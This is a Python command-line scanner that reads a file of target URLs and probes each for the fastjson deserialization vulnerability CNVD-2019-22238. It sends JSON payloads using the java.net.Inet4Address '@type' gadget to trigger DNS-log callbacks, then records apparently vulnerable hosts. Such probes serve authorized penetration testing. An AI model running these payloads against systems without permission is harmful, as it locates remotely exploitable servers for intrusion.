# @Author: Tommonkey
# @Data: 2022/9/29
# @Blog: https://www.tommonkey.cn
#
# ---------------------------------------
# Program running over that will create of file of the result in the current dirtory: result.txt
#

import requests
import argparse
import time
import socket
import json


# deal user's args
def args_deal():
    parse = argparse.ArgumentParser(prog="T-fastjson.py", description='''
    \033[5;31;44mThis program is used to probe the fastjson(CNVD-2019-22238) whether exist vulnerabilities &&& \n@Author:Tommonkey\033[0m''')
    parse.add_argument("-f", "--file", action="store", help="Batch read arms")
    parse.add_argument("--dns_log",action="store",help="create dns_log to test the arm")
    opt = parse.parse_args()
    return opt

# Read target
def args_style_deal(path):
    store_list = []
    count = 0
    with open(r"{}".format(path), encoding="utf-8") as f:
        for u in f.readlines():
            count += 1
            u = u.strip("\n")
            if "http" not in u:
                u = "http://"+u
            store_list.append(u)
        print("Read target:{}".format(count))
        return store_list

# Determine if the target belongs to fastjson
def judgeArm(list,dns_log):
    index_number = 0
    # print(list)
    length = len(list)
    print("List length: " + str(length))

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
    }

    # standard_package to send
    standard_data = {
        "examples": "don't worry,i'm good man!"
    }

    with open(r"./result.txt","a+",encoding="utf-8") as w:
        for url in list:
            index_number+=1
            new_dns_log = str(index_number)+"."+dns_log
            print("Detecting：{}".format(url))
            # print(new_dns_log)
            # print("Detecting {}...please keep patience!".format(url))
            try:
                # Payload1:version<1.2.67
                data1 = {
                    "giao": {
                        "@type": "java.net.Inet4Address",
                        "val": new_dns_log,
                    }
                }

                # Payload2:version>1.2.67
                data2 = {
                    "@type": "java.net.Inet4Address",
                    "val": new_dns_log,
                }

                time.sleep(0.5)
                type1_json = json.dumps(data1)  # change type of data
                type2_json = json.dumps(data2)

                standard_msg = requests.post(url,headers=headers,data=standard_data)
                msg1 = requests.post(url, headers=headers,data=type1_json)
                msg1.keep_live = False
                msg2 = requests.post(url, headers=headers, data=type2_json)
                msg2.keep_live = False

                if msg1.status_code == 200 and standard_msg.content != msg1.content:
                    print('''\033[5;31;44m[+]{} state_code:200   sub_dns_log:{} 可能存在fastjson命令执行漏洞，确认是否存在请查看dns_log平台记录与subject_dns_log进行比对进行确定！\033[0m'''.format(url,new_dns_log))
                    w.write(url+"\n")
                elif msg2.status_code == 200 and standard_msg.content != msg2.content:
                    print('''\033[5;31;44m[+]{} state_code:200   sub_dns_log:{} 可能存在fastjson命令执行漏洞，确认是否存在请查看dns_log平台记录与sub_dns_log进行比对进行确定！\033[0m'''.format(url,new_dns_log))
                    w.write(url+"\n")
                else:
                    print("{} daesn't exist leak".format(url))

            except Exception as err:
                # print(err)
                pass


if __name__ == "__main__":
    socket.setdefaulttimeout(4)             # The larger the value, the higher the accuracy
    startTime = time.strftime('%Y-%M-%d %H:%M:%S')
    print("start time：{}".format(startTime))
    deal_args = args_deal()
    if deal_args.file is None:
        print("Please input file's absolute path")
    if deal_args.dns_log is None:
        print("Please input DNS_log's address")
    else:
        arm_list = args_style_deal(deal_args.file)
        result = judgeArm(arm_list,deal_args.dns_log)
        print("Program running 100%\nScan finish~")
